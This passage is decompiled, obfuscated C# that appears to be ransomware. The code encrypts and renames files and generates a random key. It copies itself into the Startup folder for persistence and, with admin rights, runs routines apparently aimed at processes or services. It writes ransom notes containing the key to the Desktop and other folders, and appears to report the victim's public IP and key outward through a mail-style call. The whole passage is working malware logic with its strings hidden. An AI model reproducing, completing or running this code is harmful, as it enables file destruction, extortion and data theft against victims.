								File.Move(CS_0024_003C_003E8__locals0.ZFvhneTfBTn + LxacNwZMhxsQC, CS_0024_003C_003E8__locals0.ZFvhneTfBTn);
								return;
							}
							catch (Exception)
							{
								return;
							}
						}
					}
					else
					{
						if (fRMdlZMqiQJlz)
						{
							LxacNwZMhxsQC = QhhcIiFyoEG + LxacNwZMhxsQC;
						}
						string text2 = cNttZxOwjDja.IYgvMuxGOQDzu(32);
						string s2 = LaEpsyZsIhRz.FCwTjlNAKSS(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (LxacNwZMhxsQC != getString_0(107385393))
						{
							if (!oaSbtWubulI)
							{
								if (!csOkMUvFRZv)
								{
									TXBthYggsjbbRKZ(CS_0024_003C_003E8__locals0.ZFvhneTfBTn, CS_0024_003C_003E8__locals0.ZFvhneTfBTn + LxacNwZMhxsQC, MCumIvWMHDkz);
								}
								else
								{
									TXBthYggsjbbRKZ(CS_0024_003C_003E8__locals0.ZFvhneTfBTn, CS_0024_003C_003E8__locals0.ZFvhneTfBTn + LxacNwZMhxsQC, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!csOkMUvFRZv)
									{
										GALUkaYuFKpmDWrv(CS_0024_003C_003E8__locals0.ZFvhneTfBTn, CS_0024_003C_003E8__locals0.ZFvhneTfBTn + LxacNwZMhxsQC, MCumIvWMHDkz);
									}
									else
									{
										GALUkaYuFKpmDWrv(CS_0024_003C_003E8__locals0.ZFvhneTfBTn, CS_0024_003C_003E8__locals0.ZFvhneTfBTn + LxacNwZMhxsQC, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex11)
								{
									if (WkkVnLAdbtG)
									{
										try
										{
											File.AppendAllText(PhOHjwgFpwoPkI, getString_0(107385174) + CS_0024_003C_003E8__locals0.ZFvhneTfBTn + getString_0(107385411) + ex11.Message + getString_0(107396343));
										}
										catch (Exception)
										{
										}
									}
									WuLujtLeXYYG++;
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.ZFvhneTfBTn + LxacNwZMhxsQC, CS_0024_003C_003E8__locals0.ZFvhneTfBTn);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
						}
						else if (!oaSbtWubulI)
						{
							if (!csOkMUvFRZv)
							{
								TXBthYggsjbbRKZ(CS_0024_003C_003E8__locals0.ZFvhneTfBTn, CS_0024_003C_003E8__locals0.ZFvhneTfBTn + getString_0(107385388), MCumIvWMHDkz);
							}
							else
							{
								TXBthYggsjbbRKZ(CS_0024_003C_003E8__locals0.ZFvhneTfBTn, CS_0024_003C_003E8__locals0.ZFvhneTfBTn + getString_0(107385388), Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!csOkMUvFRZv)
								{
									GALUkaYuFKpmDWrv(CS_0024_003C_003E8__locals0.ZFvhneTfBTn, CS_0024_003C_003E8__locals0.ZFvhneTfBTn, MCumIvWMHDkz);
								}
								else
								{
									GALUkaYuFKpmDWrv(CS_0024_003C_003E8__locals0.ZFvhneTfBTn, CS_0024_003C_003E8__locals0.ZFvhneTfBTn, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex14)
							{
								if (WkkVnLAdbtG)
								{
									try
									{
										File.AppendAllText(PhOHjwgFpwoPkI, getString_0(107385174) + CS_0024_003C_003E8__locals0.ZFvhneTfBTn + getString_0(107385411) + ex14.Message + getString_0(107396343));
									}
									catch (Exception)
									{
									}
								}
								WuLujtLeXYYG++;
								return;
							}
						}
						if (csOkMUvFRZv)
						{
							if (LxacNwZMhxsQC != getString_0(107385393))
							{
								hMpFuIFlzYwoET(CS_0024_003C_003E8__locals0.ZFvhneTfBTn + LxacNwZMhxsQC, bytes2);
							}
							else
							{
								hMpFuIFlzYwoET(CS_0024_003C_003E8__locals0.ZFvhneTfBTn, bytes2);
							}
						}
					}
					end_IL_031d_2:;
				}
				catch (Exception)
				{
				}
			}
			goto IL_0ac1;
			IL_0ac1:
			mzYOAXEcxjNUBs.Remove(CS_0024_003C_003E8__locals0.ZFvhneTfBTn);
		}

		static OnfkOpDsHafJ()
		{
			Strings.CreateGetStringDelegate(typeof(OnfkOpDsHafJ));
		}
	}

	private sealed class mAAYCaBOREpjOi
	{
		public string ZKyAIFYzlzOiI;

		public string JHqWoxkmnBOB;

		public void _003CEncrypt2_003Eb__45()
		{
			while (true)
			{
				try
				{
					File.Delete(ZKyAIFYzlzOiI);
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}

		public void _003CEncrypt2_003Eb__46()
		{
			while (true)
			{
				try
				{
					if (File.Exists(JHqWoxkmnBOB))
					{
						File.Delete(JHqWoxkmnBOB);
					}
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}
	}

	public static string sqPyzQcfkCVQCPN;

	public static byte[] MCumIvWMHDkz;

	public static string SltairljJchnm;

	public static string gEOuoXeVYHB;

	public static List<string> khKeiHllADXOQ;

	public static List<string> LPwnHHwGKiFZ;

	public static string aAFtQIiSlwVw;

	public static string JzpKofJbJVhmO;

	public static string LWCdHITXViEa;

	public static string yZUiCzkorMpkDNL;

	public static int MhYLGEHjtBVV;

	public static string IzNCAdEsbOIXNEP;

	public static string nwXuXVuEvfqz;

	public static string RtrrUDTDcMvjk;

	public static string vFCLWAIFjwzum;

	public static string PUFHbRYwhBLf;

	public static string hJFAmQxZaIMujZe;

	public static string WeADOjEhFQzdZ;

	public static string YjnofmLYXjL;

	public static List<string> yWIxTWGPoW;

	public static List<string> fOFkEYMAweVTkU;

	public static string ijzRDgneEiZ;

	public static string nIhKqylYltUKZcw;

	public static string NgJQWBCIIpKK;

	public static List<string> jbCXXzvZZcmr;

	public static string GLxpiEQLFfYoBs;

	private static string auZaLVrgHBYXM;

	public static string ASNxyKnqWeCq;

	public static string gqmsRQenlXFCK;

	public static List<string> BOWLZnuqiGkLA;

	public static List<string> KNUHZPWghElTy;

	public static List<string> oXycCNmlNQf;

	public static List<string> RoJahsXJTpPr;

	public static string qYTUzbeVAfOi;

	public static List<string> VthTCnZGROUQ;

	public static List<string> NHGmvOxrKHyNP;

	public static string ndUwUldieebQzGih;

	public static string IOfSFewnzxVZ;

	internal static DateTime wepmbNgrJijpUDvo;

	internal static DateTime DiXQaVbikGJ;

	public static string SKaLbyEOuXGH;

	public static string YyzRRVpMLORcsyqnO;

	public static string MtvVnKjDFJw;

	public static string xgTNcSYvJYBSq;

	public static string SKRjkZjDmCiXnd;

	public static string qIApKptthvBp;

	public static string JXiTOIwfKbK;

	public static string JpHrjpLDqbGD;

	public static List<string> puDhoHwRWOSf;

	public static string vxbhvYdpuaSKJ;

	public static string tNcTgyProIDND;

	public static string dgJhnLCfNBcxC;

	public static string lbqZZzWjuHIRTQT;

	public static string UsTyHhCSuel;

	public static string keGLFzObTnAtzz;

	public static string EfarEYXTKyxduNx;

	public static string LWwfcoAeJyJA;

	public static string EzCobbjvThbw;

	public static string ohrGiDqyRybVB;

	public static string xUkWNCorrSa;

	public static string ZVnlTejmEDuZV;

	public static string ZdlDALrfEgIh;

	public static string bucWzIppHMvQj;

	public static string OOPEuQcNuNv;

	public static string LhORCovagF;

	public static string gTnzkxbQUizp;

	public static string WVAOfhrGMujCTSQ;

	public static string jVqUdWsOSlw;

	public static string ireqQCxdFVeGmt;

	public static string oIKxpRPmsxTM;

	public static string vFFNGQSlKJOD;

	public static string fPPatcTvdOeP;

	public static string FoQUNbbHSpsiGn;

	public static string kMCWJkiChJOZyQGt;

	public static string pFIiheiUxUaqmQ;

	public static string dmfMWdUvIkOnV;

	public static string YNeUwytrJMgeT;

	public static string MxJbfRBhftsQtF;

	public static string[] KQisENgjpTpjV;

	public static string kVikcklGsTH;

	public static bool CpKJVfXcbzad;

	public static string ctlTkMVzwMpug;

	public static bool csOkMUvFRZv;

	public static bool ofDVylLNMrZJbjz;

	public static bool YNULXblmbyCUDSh;

	public static bool CYFeVMjCnWVQdE;

	public static string PhOHjwgFpwoPkI;

	public static bool WkkVnLAdbtG;

	public static bool WKQlCLDPCsI;

	public static bool nbZEuQsHonQlJS;

	public static bool EKGlgxikXbv;

	public static bool oaSbtWubulI;

	public static string zwVfmDiFyzMi;

	public static bool vktNUmAHjywZJ;

	public static Stopwatch fTMAhxgRDBhnY;

	public static int WuLujtLeXYYG;

	public static int LFhiMkBTtnH;

	public static bool fRMdlZMqiQJlz;

	public static string QhhcIiFyoEG;

	public static string[] kgUAzEZWsZg;

	public static List<string> DAaKZBFWVuae;

	public static int UkCNBuKDQgtRHv;

	public static List<string> eljmNNVfvvqwP;

	public static List<string> bLTTMNyJBiXTe;

	public static List<string> dsVUMhqXtsa;

	private static ThreadStart CS_0024_003C_003E9__CachedAnonymousMethodDelegatee;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate13;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate14;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate15;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate16;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate17;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate1e;

	[NonSerialized]
	internal static GetString getString_0;

	private static void Main(string[] args)
	{
		try
		{
			tTFHDZkaXSli CS_0024_003C_003E8__locals0 = new tTFHDZkaXSli();
			CS_0024_003C_003E8__locals0.wBpALqpvjrq = Process.GetCurrentProcess().ProcessName;
			if (Process.GetProcesses().Count((Process process_0) => process_0.ProcessName == CS_0024_003C_003E8__locals0.wBpALqpvjrq) > 1)
			{
				return;
			}
		}
		catch (Exception)
		{
		}
		try
		{
			rACSeGSyJEju.ZKlsHJXKgfSGeH(auZaLVrgHBYXM);
		}
		catch (Exception)
		{
		}
		try
		{
			if (pFIiheiUxUaqmQ == getString_0(107396890))
			{
				Thread thread = new Thread(MAHGVLBMzRWFQMVgt.xZKzEJqJqMmeu);
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
		}
		catch
		{
		}
		if (RtrrUDTDcMvjk == getString_0(107396890))
		{
			Thread.Sleep(int.Parse(vFCLWAIFjwzum));
		}
		if (dgJhnLCfNBcxC == getString_0(107396890))
		{
			try
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					ydvgUqTTvRj CS_0024_003C_003E8__locals1 = new ydvgUqTTvRj();
					CS_0024_003C_003E8__locals1.ZzXzuwmGeXJyZTvEX = new string[4]
					{
						UPTUMFgiFSZjXAR(getString_0(107396885)),
						UPTUMFgiFSZjXAR(getString_0(107396900)),
						UPTUMFgiFSZjXAR(getString_0(107396851)),
						UPTUMFgiFSZjXAR(getString_0(107396822))
					};
					Thread thread2 = new Thread((ThreadStart)delegate
					{
						cBQxHfUOBokd.rPZfOFkDOjltl(CS_0024_003C_003E8__locals1.ZzXzuwmGeXJyZTvEX);
					});
					thread2.IsBackground = true;
					thread2.Start();
				}
			}
			catch
			{
			}
			try
			{
				UccDKVasXr.BZMBFooePicqn(UPTUMFgiFSZjXAR(getString_0(107396900)));
			}
			catch
			{
			}
			try
			{
				UccDKVasXr.BZMBFooePicqn(UPTUMFgiFSZjXAR(getString_0(107396822)));
			}
			catch
			{
			}
			try
			{
				UccDKVasXr.BZMBFooePicqn(UPTUMFgiFSZjXAR(getString_0(107396837)));
			}
			catch
			{
			}
			try
			{
				UccDKVasXr.BZMBFooePicqn(UPTUMFgiFSZjXAR(getString_0(107396851)));
			}
			catch
			{
			}
			Thread thread3 = new Thread(cBQxHfUOBokd.odriMQVPspHQ);
			thread3.IsBackground = true;
			thread3.Start();
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && JXiTOIwfKbK == getString_0(107396890))
		{
			try
			{
				dIKkxzvRVnRpx(UPTUMFgiFSZjXAR(getString_0(107396788)));
			}
			catch
			{
			}
		}
		try
		{
			if (WeADOjEhFQzdZ == getString_0(107396890) && aWGvtDJUJrZuM.CZRPamyabwDdyf())
			{
				new XGJKGjsIlKam().xNwWqpUyMLuwOf(bool_0: false);
				aWGvtDJUJrZuM.NszWwmPmHoPs();
			}
		}
		catch (Exception)
		{
		}
		if (nIhKqylYltUKZcw == getString_0(107396890) && aWGvtDJUJrZuM.CZRPamyabwDdyf())
		{
			new XGJKGjsIlKam().xNwWqpUyMLuwOf(bool_0: false);
			new XGJKGjsIlKam().rDdgjdQlSDYdzW();
		}
		if (nwXuXVuEvfqz == getString_0(107396890))
		{
			AeyaWBpTMZDro.ZgoQyHdGMwNx();
		}
		try
		{
			ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
			string fileName = mainModule.FileName;
			string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + getString_0(107397227);
			string text2 = text + Path.GetFileName(fileName);
			if (yZUiCzkorMpkDNL == getString_0(107396890) && fileName != text2)
			{
				Thread thread4 = new Thread(HVqbqMZogFrFD);
				thread4.IsBackground = true;
				thread4.Priority = ThreadPriority.Normal;
				thread4.Start();
			}
			if (aAFtQIiSlwVw == getString_0(107396890) && mainModule != null && fileName != text2)
			{
				try
				{
					MhYLGEHjtBVV = YLiyEjerXYBPS(0, yWIxTWGPoW.Count);
					File.Copy(fileName, text + yWIxTWGPoW[MhYLGEHjtBVV], overwrite: true);
					Process.Start(text + yWIxTWGPoW[MhYLGEHjtBVV]);
					uwDYbufYIoAuT();
					Process.GetCurrentProcess().Kill();
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (ndUwUldieebQzGih == getString_0(107396890) && DateTime.Now < wepmbNgrJijpUDvo)
			{
				return;
			}
		}
		catch
		{
		}
		try
		{
			if (IOfSFewnzxVZ == getString_0(107396890) && DateTime.Now > DiXQaVbikGJ)
			{
				uwDYbufYIoAuT();
			}
		}
		catch
		{
		}
		beTVRCZSvqiJHSC();
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatee == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegatee = delegate
			{
				List<string> kNUHZPWghElTy = KNUHZPWghElTy;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 = delegate(string string_0)
					{
						FsdXZodtOOOc(UPTUMFgiFSZjXAR(getString_0(107385306)), string_0);
					};
				}
				Parallel.ForEach(kNUHZPWghElTy, CS_0024_003C_003E9__CachedAnonymousMethodDelegate13);
				List<string> source = oXycCNmlNQf;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 = delegate(string string_0)
					{
						FsdXZodtOOOc(UPTUMFgiFSZjXAR(getString_0(107385325)), string_0);
					};
				}
				Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegate14);
				if (MxJbfRBhftsQtF == getString_0(107396890))
				{
					string[] kQisENgjpTpjV = KQisENgjpTpjV;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 = delegate(string string_0)
						{
							FsdXZodtOOOc(UPTUMFgiFSZjXAR(getString_0(107385325)), getString_0(107385268) + string_0 + getString_0(107385291));
						};
					}
					Parallel.ForEach(kQisENgjpTpjV, CS_0024_003C_003E9__CachedAnonymousMethodDelegate15);
				}
				if (!UwOvJGQsgCiUd().Contains(getString_0(107384988)))
				{
					jGMErVfqJFx(qYTUzbeVAfOi);
				}
				else
				{
					List<string> roJahsXJTpPr = RoJahsXJTpPr;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 = delegate(string string_0)
						{
							FsdXZodtOOOc(UPTUMFgiFSZjXAR(rKFkgeHGiEjCWNc(getString_0(107385286))), string_0);
						};
					}
					Parallel.ForEach(roJahsXJTpPr, CS_0024_003C_003E9__CachedAnonymousMethodDelegate16);
				}
				List<string> vthTCnZGROUQ = VthTCnZGROUQ;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate17 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate17 = delegate(string string_0)
					{
						FsdXZodtOOOc(UPTUMFgiFSZjXAR(getString_0(107385261)), string_0);
					};
				}
				Parallel.ForEach(vthTCnZGROUQ, CS_0024_003C_003E9__CachedAnonymousMethodDelegate17);
			};
		}
		Thread thread5 = new Thread(CS_0024_003C_003E9__CachedAnonymousMethodDelegatee);
		thread5.Priority = ThreadPriority.Normal;
		thread5.IsBackground = true;
		thread5.Start();
		try
		{
			if (File.Exists(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107397222))))
			{
				string[] array = File.ReadAllLines(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107397222)));
				string[] array2 = array;
				foreach (string text3 in array2)
				{
					if (text3.Contains(getString_0(107397173)))
					{
						string text4 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text4))
						{
							string[] array3 = text4.Split(new char[1] { ',' });
							foreach (string text5 in array3)
							{
								string text6 = text5.Trim();
								if (Directory.Exists(text6) && !khKeiHllADXOQ.Contains(text6) && text6 != getString_0(107397152) && text6 != getString_0(107397163) && text6 != getString_0(107397110))
								{
									khKeiHllADXOQ.Add(text6);
								}
							}
						}
					}
					if (text3.Contains(getString_0(107397081)))
					{
						string text7 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text7) && text7.ToLower() == getString_0(107397100))
						{
							ZdlDALrfEgIh = getString_0(107396890);
						}
						else if (!string.IsNullOrEmpty(text7) && text7.ToLower() == getString_0(107397091))
						{
							ZdlDALrfEgIh = getString_0(107397050);
						}
					}
				}
			}
		}
		catch (Exception ex6)
		{
			if (WkkVnLAdbtG)
			{
				try
				{
					File.AppendAllText(PhOHjwgFpwoPkI, getString_0(107397045) + ex6.Message);
				}
				catch (Exception)
				{
				}
			}
		}
		if (ZdlDALrfEgIh == getString_0(107397050))
		{
			hriSZARBtIlp();
		}
		if (ZdlDALrfEgIh == getString_0(107396890))
		{
			try
			{
				sMwhSGDrMTECOt();
			}
			catch
			{
			}
		}
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && YNULXblmbyCUDSh)
			{
				try
				{
					Thread thread6 = new Thread(QMFcUchCCpj.SxvTtxlXYuJt);
					thread6.IsBackground = true;
					thread6.Start();
				}
				catch
				{
				}
			}
		}
		catch (Exception)
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			FsdXZodtOOOc(getString_0(107397032), UPTUMFgiFSZjXAR(getString_0(107396987)));
		}
		SecureString secureString = new SecureString();
		if (MtvVnKjDFJw == getString_0(107397050))
		{
			Random random = new Random();
			for (int k = 0; k < 32; k++)
			{
				char value = (char)(random.Next(33, 127) % 255);
				if (Convert.ToInt32(value) != 34 && Convert.ToInt32(value) != 92)
				{
					secureString.AppendChar(Convert.ToChar(value));
				}
				else
				{
					k--;
				}
			}
		}
		else
		{
			JzpKofJbJVhmO = getString_0(107396402);
		}
		LWCdHITXViEa = LaEpsyZsIhRz.FCwTjlNAKSS(fzIFmjliUVXZT(secureString));
		if (nbZEuQsHonQlJS)
		{
			try
			{
				if (!File.Exists(Path.Combine(Directory.GetCurrentDirectory(), zwVfmDiFyzMi)))
				{
					File.WriteAllText(Path.Combine(Directory.GetCurrentDirectory(), zwVfmDiFyzMi), string.Concat(UPTUMFgiFSZjXAR(getString_0(107396389)), new WebClient().DownloadString(UPTUMFgiFSZjXAR(getString_0(107396364))), getString_0(107396323), UPTUMFgiFSZjXAR(getString_0(107396286)), DateTime.Now, getString_0(107396323), UPTUMFgiFSZjXAR(getString_0(107396245)), LWCdHITXViEa));
				}
				else
				{
					File.AppendAllText(Path.Combine(Directory.GetCurrentDirectory(), zwVfmDiFyzMi), getString_0(107396700) + LWCdHITXViEa);
				}
			}
			catch (Exception ex9)
			{
				if (WkkVnLAdbtG)
				{
					try
					{
						File.AppendAllText(PhOHjwgFpwoPkI, getString_0(107396671) + ex9.Message + getString_0(107396323));
					}
					catch (Exception)
					{
					}
				}
			}
		}
		zqQKRDaaTjO.EUXcyRIMMkZ(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), ireqQCxdFVeGmt), jnXYujfXwMd(LWCdHITXViEa), null, null, getString_0(107396654), getString_0(107396605), null);
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			yOyeXCKXeMdZ();
		}
		try
		{
			try
			{
				if (vktNUmAHjywZJ)
				{
					Console.WriteLine(getString_0(107396620));
				}
			}
			catch
			{
			}
			vKdconrAgNb(new string[26]
			{
				getString_0(107396539),
				getString_0(107396534),
				getString_0(107396529),
				getString_0(107396556),
				getString_0(107396551),
				getString_0(107396546),
				getString_0(107396509),
				getString_0(107396504),
				getString_0(107396499),
				getString_0(107396526),
				getString_0(107396521),
				getString_0(107396516),
				getString_0(107396479),
				getString_0(107396474),
				getString_0(107396469),
				getString_0(107396496),
				getString_0(107396491),
				getString_0(107396486),
				getString_0(107396481),
				getString_0(107395932),
				getString_0(107395927),
				getString_0(107395922),
				getString_0(107395949),
				getString_0(107395944),
				getString_0(107395939),
				getString_0(107395902)
			}, new string[100]
			{
				getString_0(107395897),
				getString_0(107395892),
				getString_0(107395919),
				getString_0(107395910),
				getString_0(107395905),
				getString_0(107395868),
				getString_0(107395863),
				getString_0(107395858),
				getString_0(107395885),
				getString_0(107395880),
				getString_0(107395875),
				getString_0(107395838),
				getString_0(107395829),
				getString_0(107395856),
				getString_0(107395847),
				getString_0(107395842),
				getString_0(107395805),
				getString_0(107395800),
				getString_0(107395795),
				getString_0(107395822),
				getString_0(107395813),
				getString_0(107395776),
				getString_0(107395771),
				getString_0(107395766),
				getString_0(107395761),
				getString_0(107395788),
				getString_0(107395783),
				getString_0(107395778),
				getString_0(107395741),
				getString_0(107395736),
				getString_0(107395731),
				getString_0(107395758),
				getString_0(107395753),
				getString_0(107395748),
				getString_0(107395707),
				getString_0(107395702),
				getString_0(107395697),
				getString_0(107395724),
				getString_0(107395863),
				getString_0(107395719),
				getString_0(107395885),
				getString_0(107396190),
				getString_0(107396185),
				getString_0(107396180),
				getString_0(107396207),
				getString_0(107396202),
				getString_0(107396197),
				getString_0(107396160),
				getString_0(107396155),
				getString_0(107396150),
				getString_0(107396145),
				getString_0(107396172),
				getString_0(107396167),
				getString_0(107396162),
				getString_0(107396125),
				getString_0(107396120),
				getString_0(107396115),
				getString_0(107396142),
				getString_0(107396133),
				getString_0(107396096),
				getString_0(107396087),
				getString_0(107396106),
				getString_0(107395719),
				getString_0(107396061),
				getString_0(107396052),
				getString_0(107396075),
				getString_0(107396066),
				getString_0(107396025),
				getString_0(107396048),
				getString_0(107396043),
				getString_0(107396034),
				getString_0(107395993),
				getString_0(107396016),
				getString_0(107396011),
				getString_0(107396006),
				getString_0(107396001),
				getString_0(107395964),
				getString_0(107395959),
				getString_0(107395954),
				getString_0(107395977),
				getString_0(107395972),
				getString_0(107395423),
				getString_0(107395418),
				getString_0(107395413),
				getString_0(107395440),
				getString_0(107395431),
				getString_0(107395390),
				getString_0(107395385),
				getString_0(107395753),
				getString_0(107395380),
				getString_0(107395407),
				getString_0(107395402),
				getString_0(107395397),
				getString_0(107395360),
				getString_0(107395351),
				getString_0(107395346),
				getString_0(107395373),
				getString_0(107395364),
				getString_0(107395327),
				getString_0(107395322)
			}, new string[0], fzIFmjliUVXZT(secureString), getString_0(107395317));
		}
		catch (Exception ex11)
		{
			if (WkkVnLAdbtG)
			{
				try
				{
					File.AppendAllText(PhOHjwgFpwoPkI, getString_0(107395340) + ex11.Message);
				}
				catch (Exception)
				{
				}
			}
			try
			{
				secureString.Dispose();
			}
			catch
			{
			}
		}
		try
		{
			secureString.Dispose();
		}
		catch
		{
		}
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395283)))
			{
				using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395283));
				streamWriter.WriteLine(UPTUMFgiFSZjXAR(getString_0(107395250)));
				streamWriter.WriteLine(getString_0(107396323));
				streamWriter.WriteLine(UPTUMFgiFSZjXAR(getString_0(107392984)));
				streamWriter.WriteLine(LWCdHITXViEa);
				if (ASNxyKnqWeCq == getString_0(107397050))
				{
					streamWriter.WriteLine(getString_0(107396323));
					streamWriter.WriteLine(UPTUMFgiFSZjXAR(getString_0(107392951)) + Convert.ToString(jbCXXzvZZcmr.Count));
				}
				if (fRMdlZMqiQJlz)
				{
					streamWriter.WriteLine(getString_0(107396323));
					streamWriter.WriteLine(UPTUMFgiFSZjXAR(getString_0(107392906)));
					streamWriter.WriteLine(boHoxxDHHXchTbg.wdLdkHIHAypDJRkz());
				}
			}
			else
			{
				string text8 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395283));
				if (!text8.Contains(LWCdHITXViEa) && !csOkMUvFRZv)
				{
					File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395283), getString_0(107392361) + LWCdHITXViEa);
				}
			}
		}
		catch
		{
		}
		int num = 0;
		foreach (string item in fOFkEYMAweVTkU)
		{
			num++;
			try
			{
				if (item == Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
				{
					continue;
				}
			}
			catch
			{
			}
			try
			{
				if (!File.Exists(item + getString_0(107395283)))
				{
					File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395283), item + getString_0(107395283), overwrite: true);
				}
				else
				{
					string text9 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395283));
					if (!text9.Contains(LWCdHITXViEa) && !csOkMUvFRZv)
					{
						File.AppendAllText(item + getString_0(107395283), getString_0(107392361) + LWCdHITXViEa);
					}
				}
			}
			catch (Exception)
			{
			}
			if (!CYFeVMjCnWVQdE && num > 10)
			{
				break;
			}
		}
		if (fPPatcTvdOeP == getString_0(107396890))
		{
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107392332)))
				{
					using StreamWriter streamWriter2 = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107392332));
					streamWriter2.WriteLine(UPTUMFgiFSZjXAR(getString_0(107392299)));
					streamWriter2.WriteLine(getString_0(107396323));
					streamWriter2.WriteLine(UPTUMFgiFSZjXAR(getString_0(107388849)));
					streamWriter2.WriteLine(LWCdHITXViEa + UPTUMFgiFSZjXAR(getString_0(107388248)));
					if (ASNxyKnqWeCq == getString_0(107397050))
					{
						streamWriter2.WriteLine(getString_0(107396323));
						streamWriter2.WriteLine(UPTUMFgiFSZjXAR(getString_0(107388267)) + UPTUMFgiFSZjXAR(getString_0(107392951)) + Convert.ToString(jbCXXzvZZcmr.Count) + UPTUMFgiFSZjXAR(getString_0(107388248)));
					}
					if (fRMdlZMqiQJlz)
					{
						streamWriter2.WriteLine(getString_0(107396323));
						streamWriter2.WriteLine(UPTUMFgiFSZjXAR(getString_0(107392906)));
						streamWriter2.WriteLine(boHoxxDHHXchTbg.wdLdkHIHAypDJRkz());
					}
				}
				else
				{
					string text10 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395283));
					if (!text10.Contains(LWCdHITXViEa) && !csOkMUvFRZv)
					{
						File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107392332), UPTUMFgiFSZjXAR(getString_0(107388267)) + getString_0(107392361) + LWCdHITXViEa + UPTUMFgiFSZjXAR(getString_0(107388248)));
					}
				}
			}
			catch
			{
			}
		}
		if (GLxpiEQLFfYoBs == getString_0(107396890))
		{
			try
			{
				if (ASNxyKnqWeCq == getString_0(107397050))
				{
					boHoxxDHHXchTbg.pCegEhjfTlJx(getString_0(107388206), getString_0(107388201), getString_0(107388156), string.Concat(UPTUMFgiFSZjXAR(getString_0(107396389)), new WebClient().DownloadString(UPTUMFgiFSZjXAR(getString_0(107396364))), getString_0(107388147), UPTUMFgiFSZjXAR(getString_0(107396286)), DateTime.Now, getString_0(107396323), UPTUMFgiFSZjXAR(getString_0(107388174)), Convert.ToString(jbCXXzvZZcmr.Count), getString_0(107396323), UPTUMFgiFSZjXAR(getString_0(107396245)), LWCdHITXViEa));
				}
				else
				{
					boHoxxDHHXchTbg.pCegEhjfTlJx(getString_0(107388206), getString_0(107388201), getString_0(107388156), string.Concat(UPTUMFgiFSZjXAR(getString_0(107396389)), new WebClient().DownloadString(UPTUMFgiFSZjXAR(getString_0(107396364))), getString_0(107388147), UPTUMFgiFSZjXAR(getString_0(107396286)), DateTime.Now, getString_0(107396323), UPTUMFgiFSZjXAR(getString_0(107388174)), Convert.ToString(jbCXXzvZZcmr.Count), getString_0(107396323), UPTUMFgiFSZjXAR(getString_0(107396245)), LWCdHITXViEa));
				}
			}
			catch
			{
			}
		}
		if (YjnofmLYXjL == getString_0(107396890))
		{
			try
			{
				mLIgddNPAbhG.YEiDvlcSiSH(new Uri(getString_0(107388093)));
			}
			catch
			{
			}
		}
		if (fPPatcTvdOeP == getString_0(107397050))
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395283)))
				{
